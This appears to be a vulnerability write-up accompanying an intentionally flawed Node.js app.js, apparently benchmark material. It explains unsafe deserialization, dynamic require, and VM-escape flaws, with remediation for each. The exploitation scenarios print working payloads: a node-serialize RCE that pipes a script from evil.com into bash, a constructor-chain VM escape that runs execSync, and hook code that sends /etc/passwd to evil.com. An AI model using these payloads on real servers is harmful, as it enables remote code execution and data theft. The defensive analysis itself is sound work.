# Security Companion Document: app.js

## Vulnerability: Unsafe Deserialization of Job Import via node-serialize

**CWE:** CWE-502
**OWASP:** A08
**Complexity Level:** Obvious
**Detection Difficulty:** Easily_Detectable
**Affected Lines:** L113-L113

### Description
The `/api/jobs/import` endpoint passes user-supplied data directly to `deserialize()` from the `node-serialize` library. This library can execute arbitrary JavaScript during deserialization when the serialized data contains function expressions with the IIFE (Immediately Invoked Function Expression) pattern `_$$ND_FUNC$$_`.

### Exploitation Scenario
An attacker sends a payload containing `{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('curl http://evil.com/shell.sh | bash')}()"}` to the import endpoint. The `deserialize()` function detects the `_$$ND_FUNC$$_` prefix and evaluates the function, executing the embedded command on the server.

### Remediation Guidance
Replace `node-serialize` with `JSON.parse()`:
```javascript
const jobData = JSON.parse(payload);
```
The `node-serialize` library should never be used with untrusted input. Use standard JSON parsing for data interchange.

### Complexity Rationale
This is rated Obvious because `deserialize()` on user-supplied input is a well-documented vulnerability in the `node-serialize` library, and the pattern is a textbook example of unsafe deserialization.

### Detection Difficulty Rationale
This is rated Easily_Detectable because SAST tools can match the `deserialize` import from `node-serialize` and flag any call with user-controlled input. The library itself is flagged as vulnerable in npm audit databases.

---

## Vulnerability: Unsafe Deserialization in Data Store Retrieval

**CWE:** CWE-502
**OWASP:** A08
**Complexity Level:** Moderate
**Detection Difficulty:** Pattern_Dependent
**Affected Lines:** L213-L213

### Description
The `/api/data/:key` endpoint retrieves serialized data from the data store and passes it to `deserialize()` from `node-serialize`. The data was originally serialized via the `/api/data/store` endpoint using `serialize()`, but since the serialized string is stored as-is, an attacker who can write to the data store can inject a malicious serialized payload containing executable functions.

### Exploitation Scenario
An attacker stores a crafted serialized string via `/api/data/store` that contains a `_$$ND_FUNC$$_` function expression. When any user retrieves that key, `deserialize()` evaluates the embedded function, executing arbitrary code on the server.

### Remediation Guidance
Store data as JSON and retrieve with `JSON.parse()`:
```javascript
// Store
dataStore[key] = { data: JSON.stringify(value), storedAt: Date.now() };

// Retrieve
const restored = JSON.parse(entry.data);
```

### Complexity Rationale
This is rated Moderate because the vulnerability spans two endpoints (store and retrieve), requiring a reviewer to trace the data flow and understand that the serialized format preserves executable function expressions.

### Detection Difficulty Rationale
This is rated Pattern_Dependent because SAST tools need to trace the data flow from the store endpoint through the data store to the retrieve endpoint and recognize that `deserialize` on stored data is dangerous even when the data was originally serialized by the application.

---

## Vulnerability: Arbitrary Module Loading via require()

**CWE:** CWE-829
**OWASP:** A08
**Complexity Level:** Moderate
**Detection Difficulty:** Pattern_Dependent
**Affected Lines:** L178-L178

### Description
The `/api/plugins/install` endpoint calls `require()` with a user-supplied `packageUrl` value. Node.js `require()` can load modules from local file paths or installed packages, and if the attacker can control the path, they can load arbitrary modules including native addons that execute code upon loading.

### Exploitation Scenario
An attacker with engineer credentials sends `packageUrl` set to a path like `/tmp/malicious-module` where they have previously uploaded a malicious Node.js module (via another vulnerability or shared filesystem). The `require()` call loads and executes the module's initialization code.

### Remediation Guidance
Use a trusted plugin registry instead of dynamic `require()`:
```javascript
const TRUSTED_PLUGINS = {
  "analytics": "./plugins/analytics",
  "reporting": "./plugins/reporting",
};

const modulePath = TRUSTED_PLUGINS[name];
if (!modulePath) {
  return res.status(400).json({ error: "Unknown plugin" });
}
const mod = require(modulePath);
```

### Complexity Rationale
This is rated Moderate because `require()` with user input is a known dangerous pattern, but the endpoint frames it as a plugin installation feature and is behind role-based access control, which may reduce perceived risk during review.

### Detection Difficulty Rationale
This is rated Pattern_Dependent because SAST tools need to trace the `packageUrl` parameter from the request body to the `require()` call and recognize that dynamic `require()` with user-controlled input enables arbitrary code loading.

---

## Vulnerability: VM Context Escape via Template Rendering

**CWE:** CWE-829
**OWASP:** A08
**Complexity Level:** Nuanced
**Detection Difficulty:** Likely_Missed
**Affected Lines:** L155-L157

### Description
The `/api/templates/:id/render` endpoint uses `vm.createContext()` and `vm.runInContext()` to render templates with user-supplied variables. The template body is interpolated into a JavaScript template literal and executed. Node.js `vm` module contexts are not true sandboxes — code running inside can escape the context and access the host process through prototype chain traversal.

### Exploitation Scenario
An attacker creates a template with body `${this.constructor.constructor('return process')().mainModule.require('child_process').execSync('id')}`. When rendered, the code escapes the VM sandbox by traversing the constructor chain to access the global `process` object, then uses `require` to execute system commands.

### Remediation Guidance
Do not use `vm` module for sandboxing untrusted code. Use a proper template engine with auto-escaping:
```javascript
const Handlebars = require("handlebars");
const template = Handlebars.compile(templateBody);
const rendered = template(variables);
```
For true sandboxing, use `vm2` or `isolated-vm` libraries.

### Complexity Rationale
This is rated Nuanced because the code uses `vm.createContext()` which appears to create an isolated sandbox. A reviewer must understand that Node.js `vm` contexts are not security boundaries and that prototype chain traversal can escape the context.

### Detection Difficulty Rationale
This is rated Likely_Missed because SAST tools typically do not flag `vm.runInContext()` as a security issue since it appears to be a sandboxed execution environment. Detecting the sandbox escape requires understanding Node.js VM internals and prototype chain attacks.

---

## Vulnerability: Remote Code Execution via Hook Registration

**CWE:** CWE-829
**OWASP:** A08
**Complexity Level:** Nuanced
**Detection Difficulty:** Likely_Missed
**Affected Lines:** L237-L240

### Description
The `/api/hooks/register` endpoint fetches JavaScript code from a user-supplied URL (via HTTP or HTTPS), wraps it in a function, and executes it using `vm.Script` and `vm.runInContext()`. The context includes `require` and `console`, giving the fetched code full access to Node.js APIs including filesystem, network, and child process modules.

### Exploitation Scenario
An attacker with engineer credentials registers a hook with a URL pointing to `http://evil.com/hook.js` containing `require('child_process').execSync('curl http://evil.com/exfil?data=' + require('fs').readFileSync('/etc/passwd'))`. The server fetches and executes the code with full Node.js API access, exfiltrating sensitive files.

### Remediation Guidance
Never execute code fetched from remote URLs. Use a predefined set of hook handlers:
```javascript
const HOOK_HANDLERS = {
  "notify-slack": (event) => { /* predefined logic */ },
  "log-event": (event) => { /* predefined logic */ },
};

const handler = HOOK_HANDLERS[req.body.handler];
if (!handler) return res.status(400).json({ error: "Unknown hook handler" });
```

### Complexity Rationale
This is rated Nuanced because the vulnerability involves fetching remote code and executing it in a VM context that includes `require`. The multi-step process (HTTP fetch, wrap in function, create context with `require`, execute) obscures the direct connection between user input and code execution.

### Detection Difficulty Rationale
This is rated Likely_Missed because SAST tools would need to trace the data flow from an HTTP response body through string concatenation into `vm.Script` construction and execution, while also recognizing that the VM context includes `require` which breaks any sandboxing. This multi-step network-to-execution flow is beyond most static analysis capabilities.
